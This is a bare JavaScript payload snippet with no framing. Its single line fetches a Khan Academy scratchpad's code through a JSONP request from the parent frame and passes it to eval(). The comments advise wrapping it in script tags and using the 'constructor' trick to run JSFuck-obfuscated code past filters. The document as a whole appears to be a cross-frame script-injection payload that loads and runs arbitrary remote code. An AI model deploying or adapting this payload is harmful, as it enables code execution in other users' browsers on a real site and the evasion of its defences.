parent.$.getJSON(`https://www.khanacademy.org/api/labs/scratchpads/${id}?callback=?`,f=>eval(f.revision.code))

// wrap in <script type></script> tags
// a='constructor';a[a][a](jsfuck code)